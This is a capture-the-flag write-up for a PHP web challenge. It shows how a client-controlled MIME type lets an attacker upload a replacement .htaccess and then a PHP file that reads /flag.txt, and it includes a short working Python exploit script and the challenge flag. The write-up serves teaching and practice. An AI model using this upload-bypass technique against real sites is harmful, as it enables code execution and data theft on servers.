# legal-complaint-form

[library.m0unt41n.ch/challenges/legal-complaint-form](https://library.m0unt41n.ch/challenges/legal-complaint-form) ![](../../resources/web.svg) ![](../../resources/easy.svg) 

# TL;DR

We get a webapp for submitting and viewing "legal complaints" - defined as: {email, text uploaded file}.

*   `GET /index.php` has a form that allows submitting requests that consist of: email, some text, attachment (PDF/GIF/JPG).
*   `POST /submit.php` processes the form inputs:
    *    Check for allowed file types (JPG/GIF/PNG/PDF)
    *    Copies the file to `uploads/` directory, under originally uploaded name.
    *    Add case information to the DB
    *    Presents a confirmation dialog, with a link to the viewable case.
*   The requests can be viewed at: `/case.php?id=670d0b3d6d83e`
*   The attachments are accessible at `/uploads/filename.ext`
*   The flag is in `/flag.txt`

# Analysis

Obvious things first:

*   Obvious things first: no, `GET /uploads/../../../../flag.txt` does not work &#128578;

*   `/case.php` won't help, as it just provides a link to `uploads/`. And, it's
    sanitized anyway:

    ```php
    <b>Attachment:</b>
    <p><a href="<?php echo $complaint['file']; ?>"><?php echo basename($complaint['file']); ?></a></p>
    ```

*   The application checks MIME type of the uploaded files:

    ```php
    if (!in_array($_FILES['file']['type'], ['image/jpeg', 'image/gif', 'image/png', 'application/pdf'])) {
        header('Location: /?error='.urlencode("Invalid file!"));
        exit();
    }
    ```

*   There is a restrictive `.htaccess` in `uploads/` directory:

    ```htaccess
    <FilesMatch "\.php$">
    Order Deny,Allow
    Deny from all
    </FilesMatch>
    ```

## What is $_FILES?

Per https://www.php.net/manual/en/features.file-upload.post-method.php:

> The global $_FILES will contain all the uploaded file information. Its
> contents from the example form is as follows. Note that this assumes the use
> of the file upload name userfile, as used in the example script above. This
> can be any name.
>
> | Variable                           | Contents                                                                                                                                                                                                      |
> | ---------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
> | `$_FILES['userfile']['name']`      | The original name of the file on the client machine.                                                                                                                                                          |
> | `$_FILES['userfile']['type']`      | The mime type of the file, if the browser provided this information. An example would be `"image/gif"`. This mime type is however not checked on the PHP side and therefore don't take its value for granted. |
> | `$_FILES['userfile']['size']`      | The size, in bytes, of the uploaded file.                                                                                                                                                                     |
> | `$_FILES['userfile']['tmp_name']`  | The temporary filename of the file in which the uploaded file was stored on the server.                                                                                                                       |
> | `$_FILES['userfile']['error']`     | The error code associated with this file upload.                                                                                                                                                              |
> | `$_FILES['userfile']['full_path']` | The full path as submitted by the browser. This value does not always contain a real directory structure, and cannot be trusted. Available as of PHP 8.1.0.                                                   |
> 
> Files will, by default be stored in the server's default temporary directory,
> unless another location has been given with the `upload_tmp_dir` directive in
> `php.ini`. The server's default directory can be changed by setting the
> environment variable `TMPDIR` in the environment in which PHP runs. Setting
> it using `putenv()` from within a PHP script will not work. This environment
> variable can also be used to make sure that other operations are working on
> uploaded files, as well. 

The program does not set a specific `TMPDIR` and there does not seem to be one
in Apaches's `/proc/PID/environ` either. Patching `submit.php` to print the
`tmp_name`, we see that files are stored as e.g. `/tmp/phpTqW1zz`.

## The idea

We can not upload a PHP file for execution, because of the MIME check. This
can be bypassed - see above table, the file name (thus, extension) and MIME
type are sent separately. But then, `uploads/.htaccess` will prevent executing
it.

Maybe we can upload `.htaccess` then? &#128578; Something like:

*   Use `POST /submit.php` to submit a permissive (empty?) `.htaccess`, but, in the
    request, set: `name=".htaccess"` and `type="image/gif"`.
*   Use `POST /submit.php` to submit a malicious `exploit.php`, similarly,
    pretend it is one of the allowed MIME types
*   Execute `GET /uploads/exploit.php`.

# The exploit

[exploit.py](https://github.com/mufl0n/mufl0n.github.io/blob/main/shc/web/legal-complaint-form/exploit.py)

```python
import requests
import tempfile

URL="http://localhost:8080"
(_, TMPFILE) = tempfile.mkstemp()

open(TMPFILE, "w").write("")
requests.post(URL+"/submit.php",
              data={'email': 'user@gmail.com', 'description': 'My complaint'},
              files={'file': ('.htaccess', open(TMPFILE, "rb"), 'image/gif')})

open(TMPFILE, "w").write("<?php echo file_get_contents(\"/flag.txt\") ?>")
requests.post(URL+"/submit.php",
              data={'email': 'user@gmail.com', 'description': 'My complaint'},
              files={'file': ('exploit.php', open(TMPFILE, "rb"), 'image/gif')})

print(requests.get(URL+"/uploads/exploit.php").text)
```

# Bugs

*   All attachments are stored in a single directory, under original name.
    So, attachments from one case can overwrite those from another.
*   When running the container from cmdline, it dies on resizing the terminal window:

    ```
    [Mon Oct 14 12:08:09.096395 2024] [mpm_prefork:notice] [pid 1] AH00170: caught SIGWINCH, shutting down gracefully
    ```

---

## `shc2024{byp4ss3d_f1l3_typ3_ch3ck_a9834hrf}`



<hr>

&copy; [muflon77](https://library.m0unt41n.ch/players/805ae1c8-9fe4-5816-b4a4-5057fa6eedb1)
